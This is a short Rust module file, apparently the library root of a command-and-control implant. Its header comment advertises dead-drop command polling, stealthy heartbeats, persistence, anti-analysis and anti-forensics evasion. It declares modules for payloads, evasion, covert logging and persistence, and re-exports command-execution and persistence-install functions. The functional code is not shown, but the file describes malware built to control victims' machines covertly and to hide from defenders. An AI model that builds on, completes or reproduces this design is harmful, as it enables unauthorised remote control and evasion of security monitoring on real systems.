//! C2 Agent — Async Dead-Drop C2 Client
//!
//! Polls dead-drop repos for zero-width encoded commands.
//! Features:
//! - Multi-repo randomized polling with exponential backoff
//! - Self-healing: auto-recover from transient failures
//! - Heartbeat via open redirect for stealth
//! - Command deduplication
//! - Cross-platform persistence
//! - Anti-analysis: debugger/VM/sandbox detection
//! - Anti-forensics: process masquerading, exe spoofing

mod agent;
mod executor;
mod fetcher;
mod heartbeat;
mod persistence;
pub mod anti_analysis;
pub mod stealth;
pub mod zw_heartbeat;
pub mod rustsploit_bridge;
pub mod payload;
pub mod evasion;
pub mod systemd_gen;
pub mod uncovered;
pub mod anti_forensics;
pub mod combined_mcp;
pub mod icmp_heartbeat;
pub mod log_covert;

pub use agent::Agent;
pub use executor::execute_command;
pub use fetcher::Fetcher;
pub use heartbeat::Heartbeat;
pub use persistence::install_persistence;
